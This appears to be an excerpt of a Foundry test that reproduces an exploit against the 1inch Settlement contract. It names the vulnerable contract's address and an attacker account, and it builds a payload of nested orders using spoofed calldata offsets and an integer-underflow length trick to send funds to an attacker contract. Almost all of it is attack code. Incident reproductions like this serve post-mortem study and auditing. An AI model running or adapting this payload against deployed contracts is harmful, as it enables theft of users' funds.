...
contract Exploit_OneInch is Test, TestHarness, TokenBalanceTracker {
    // Attacker EOA
    address public constant ATTACKER_EOA =
        0xA7264a43A57Ca17012148c46AdBc15a5F951766e;

    // Protocol contracts
    // 1inch Settlement - the vulnerable contract
    ISettlement private constant settlement =
        ISettlement(0xA88800CD213dA5Ae406ce248380802BD53b47647);
    ...
    uint256 private constant PADDING_SIZE =
        SPOOFED_INTERACTION_OFFSET - SPOOFED_SIGNATURE_OFFSET;
    ...
    uint256 private constant NEGATIVE_LENGTH_UNDERFLOW =
        type(uint256).max - 511; // -512 as int256
    ...
    function buildExploitPayload() internal view returns (bytes memory) {
        ...
        bytes memory interaction4 = buildNestedInteraction(
            buildOrder({salt: 0, receiver: address(attacker), takingAmount: 1}),
            emptySignature,
            interaction5
        );

        bytes memory interaction3 = buildNestedInteraction(
            buildOrder({salt: 1, receiver: address(attacker), takingAmount: 1}),
            emptySignature,
            interaction4
        );

        bytes memory interaction2 = buildNestedInteraction(
            buildOrder({salt: 2, receiver: address(attacker), takingAmount: 1}),
            emptySignature,
            interaction3
        );

        bytes memory interaction1 = buildNestedInteraction(
            buildOrder({salt: 3, receiver: address(attacker), takingAmount: 1}),
            emptySignature,
            interaction2
        );
    ...
    function buildNestedInteraction(
        Order memory order,
        bytes memory signature,
        bytes memory nextInteraction
...
contract AttackerContract {
    ISettlement public constant settlement =
        ISettlement(0xA88800CD213dA5Ae406ce248380802BD53b47647);
    address public constant ATTACKER_EOA =
        0xA7264a43A57Ca17012148c46AdBc15a5F951766e;
